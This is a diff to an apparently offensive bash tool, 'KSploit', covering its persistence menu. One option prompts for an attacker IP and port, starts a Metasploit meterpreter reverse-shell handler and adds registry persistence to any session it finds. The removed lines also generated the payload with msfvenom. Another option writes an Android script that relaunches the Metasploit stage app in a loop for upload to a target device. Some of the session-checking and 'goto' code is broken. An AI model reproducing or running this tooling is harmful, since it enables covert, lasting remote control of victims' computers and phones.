@@ -500,95 +500,90 @@ mfconsole()
 ################################################################################
 # Persistence Menu
 ################################################################################
-persist()
-{
-clear
-echo ${LIGHT_CYAN} 
-echo "   ____               _     _                      "
-echo "  |  _ \ ___ _ __ ___(_)___| |_ ___ _ __   ___ ___ "
-echo "  | |_) / _ \ '__/ __| / __| __/ _ \ '_ \ / __/ _ \\${GREEN}"
-echo "  |  __/  __/ |  \__ \ \__ \ ||  __/ | | | (_|  __/${LIGHT_MAGENTA}"
-echo "  |_|   \___|_|  |___/_|___/\__\___|_| |_|\___\___|"
-echo "  ⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛"
-echo ${LIGHT_MAGENTA} 
-echo "  Use the persistence menu to quickly forge persistence scripts. Currently supports windows and android scripts." |fmt -w 60
-echo
-pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
-#stay:
-clear
-echo ${YELLOW}
-echo "	   _____________________________________________"
-echo "	  |${FGG}       KSploit Persistence Menu Options:     ${NC}${YELLOW}|"
-echo "	  |---------------------------------------------|"
-echo "	  |    🖥️ ${GREEN} 1 ${BLUE}Windows Persitence Script.          ${YELLOW}|"
-echo "	  |---------------------------------------------|"
-echo "	  |    🤖${GREEN} 2 ${BLUE}Android Persistence Script.         ${YELLOW}|"
-echo "	  |---------------------------------------------|"
-echo "	  |    🚪${GREEN} q ${BLUE}Quit to the main menu.              ${YELLOW}|"
-echo "	  |_____________________________________________${YELLOW}|${GREEN}"
-echo	
-   errors
-   echo "${GREEN}"
-   read -n1 -p "     	  What do you want to do? Choose: [1,2,q]    " opt
-   echo
-   echo
-   locals
+persist() {
+    clear
+    echo "${LIGHT_CYAN}"
+    echo "   ____               _     _                      "
+    echo "  |  _ \ ___ _ __ ___(_)___| |_ ___ _ __   ___ ___ "
+    echo "  | |_) / _ \ '__/ __| / __| __/ _ \ '_ \ / __/ _ \\${GREEN}"
+    echo "  |  __/  __/ |  \__ \ \__ \ ||  __/ | | | (_|  __/${LIGHT_MAGENTA}"
+    echo "  |_|   \___|_|  |___/_|___/\__\___|_| |_|\___\___|"
+    echo "  ⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛"
+    echo ${LIGHT_MAGENTA}
+    echo "  Use the persistence menu to quickly forge persistence scripts. Currently supports windows and android scripts." | fmt -w 60
+    echo
+    pause '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+    #stay:
+    clear
+    echo ${YELLOW}
+    echo "      _____________________________________________"
+    echo "     |${FGG}       KSploit Persistence Menu Options:     ${NC}${YELLOW}|"
+    echo "     |---------------------------------------------|"
+    echo "     |    🖥️ ${GREEN} 1 ${BLUE}Windows Persitence Script.          ${YELLOW}|"
+    echo "     |---------------------------------------------|"
+    echo "     |    🤖${GREEN} 2 ${BLUE}Android Persistence Script.         ${YELLOW}|"
+    echo "     |---------------------------------------------|"
+    echo "     |    🚪${GREEN} q ${BLUE}Quit to the main menu.              ${YELLOW}|"
+    echo "     |_____________________________________________${YELLOW}|${GREEN}"
+    echo
+    errors
+    echo "${GREEN}"
+    read -n1 -p "          What do you want to do? Choose: [1,2,q]    " opt
+    echo
+    echo
+    locals
     case $opt in
-        1) # New function, pending testing
-  	 	  echo "Forging a Windows Persistence Script:"
-		  echo
-		  read -p 'Set Attacker IP: ' attackerip
-		  read -p 'Set Attacker Port: ' attackerport
-		  read -p 'Set Callback Interval: ' attinterval
-		  echo
-		  echo "Generating payload..."
-		  payload=$(msfvenom -p windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -f exe -o /path/to/payload.exe)
-		  echo "Payload generated: $payload"
-		  echo
-		  echo "Starting Metasploit..."
-		  msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $attackerip; set LPORT $attackerport; exploit -j" &
-		  sleep 5 # Give Metasploit some time to start
+        1)
+            echo "          ${FGC}    Forging a Windows Persistence Script:${NC}${YELLOW}"
+            echo
+            read -p '        Set Attacker IP: ' attackerip
+            read -p '        Set Attacker Port: ' attackerport
+            read -p '        Set Callback Interval: ' attinterval
+            echo
+            echo "          --> Starting Metasploit..."
+            xterm -e msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $attackerip; set LPORT $attackerport; exploit -j" &
+            sleep 5 # Give Metasploit some time to start
 
-		  # Check for an active session
-		  session=$(msfconsole -q -x "sessions -l" | grep "meterpreter" | awk '{print $1}')
-		  if [ -n "$session" ]; then
-			  echo "Session $session is active. Adding persistence..."
-			  msfconsole -q -x "use exploit/windows/local/persistence; set session $session; set LHOST $attackerip; set LPORT $attackerport; exploit" &
-			  sleep 5 # Give Metasploit some time to add persistence
-			  echo
-			  echo "Persistence added!"
-		  else
-			  echo "No active session found. Persistence cannot be added."
-		  fi
+            # Check for an active session
+            SESSION_ID=$(msfconsole sessions -l | grep 'Id' | awk '{print $1}')
+            if [ -n "$SESSION_ID" ]; then
+                echo "Session $SESSION_ID is active. Adding persistence..."
+                msfconsole -q -x "use exploit/windows/x64/local/registry_persistence; set session $SESSION_ID; set LHOST $attackerip; set LPORT $attackerport; exploit -j" &
+                sleep 5 # Give Metasploit some time to add persistence
+                echo
+                echo "Persistence added!"
+            else
+                echo "No active session found. Persistence cannot be added."
+            fi
 
-          pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
-          goto stay;
-	;;
+            pause '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+            goto stay
+            ;;
         2)
-          echo "         ${FGC}     Forging an Android Persistence Script :     ${NC}${YELLOW}"
-          touch $wdir/android.sh
-          echo "#!/bin/bash" > $wdir/android.sh
-          echo "while :" >> $wdir/android.sh
-          echo "do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity" >> $wdir/android.sh
-          echo "sleep 20" >> $wdir/android.sh
-          echo "done" >> $wdir/android.sh
-          sleep 2
-          echo 
-          echo -e "          ⌛⌛⌛ Your Persistence Script saved to $wdir/android.sh "
-          echo -e "                Upload it to / on target android device${NC}" 
-  	  echo 
-          pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
-          goto stay;
-        ;;  
-	q)
-	  clear
-	  goto start;
-	;;
-	*)
-          clear 
-          error="$opt is not a valid option!"      	
-          goto stay;
-	;;
+            echo "         ${FGC}     Forging an Android Persistence Script :     ${NC}${YELLOW}"
+            touch $wdir/android.sh
+            echo "#!/bin/bash" > $wdir/android.sh
+            echo "while :" >> $wdir/android.sh
+            echo "do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity" >> $wdir/android.sh
+            echo "sleep 20" >> $wdir/android.sh
+            echo "done" >> $wdir/android.sh
+            sleep 2
+            echo 
+            echo -e "          ⌛⌛⌛ Your Persistence Script saved to $wdir/android.sh "
+            echo -e "                Upload it to / ontarget android device${NC}"
+            echo 
+            pause '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+            goto stay
+            ;;
+        q)
+            clear
+            goto start
+            ;;
+        *)
+            clear
+            error="$opt is not a valid option!"
+            goto stay
+            ;;
     esac
 }
 ################################################################################
